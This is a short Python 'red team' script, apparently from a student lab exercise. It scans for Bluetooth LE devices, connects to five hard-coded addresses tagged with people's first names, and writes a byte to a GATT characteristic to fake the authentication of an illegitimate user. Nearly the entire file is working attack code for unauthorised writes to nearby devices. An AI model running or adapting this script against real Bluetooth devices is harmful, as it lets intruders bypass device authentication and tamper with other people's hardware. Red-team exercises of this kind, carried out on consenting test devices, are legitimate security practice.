# RED TEAM CODE
# Write incorrect data to peripheral characteristic to authenticate an illegitimate user
from bluepy.btle import Scanner, DefaultDelegate, Peripheral, UUID
import sys

sys.tracebacklimit = 0
class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

def scan_devices():
    scanner = Scanner().withDelegate(ScanDelegate())
    devices = scanner.scan(1.0)
    return devices

def create_interference(devices):
    target_addies = ["3f:ba:f5:38:70:17",
            "d3:ea:a6:7d:56:27",
            "73:dd:f4:95:60:87",
            "f6:1d:0c:e4:b7:a7",
            "fc:a2:94:6d:7f:0d"] # Order: Nate, Ali, Josiah, Kenyan, Josh
    
    for dev in devices:
        if dev.addr in target_addies:
            try:
                print("Attempting to connect to ", dev.addr)
                peripheral = Peripheral(dev.addr)
                    
                # Write incorrect data to characteristic
                data = True
                service_uuid = UUID("0020")
                characteristic_uuid = UUID("0020")
                service = peripheral.getServiceByUUID(service_uuid)
                characteristic = service.getCharacteristics(characteristic_uuid)[0]
                print("Searing message into ", characteristic)
                characteristic.write(b'\x01', withResponse = True)

                peripheral.disconnect()
                print("Disconnected from ", dev.addr)
            except Exception as e:
                sys.exit(1)

if __name__ == "__main__":
    try:
        print("Scanning for Bluetooth devices...")
        devices = scan_devices()
        print("Starting Data Send...")
        create_interference(devices)
    except KeyboardInterrupt:
        print("Stopping Data Send")
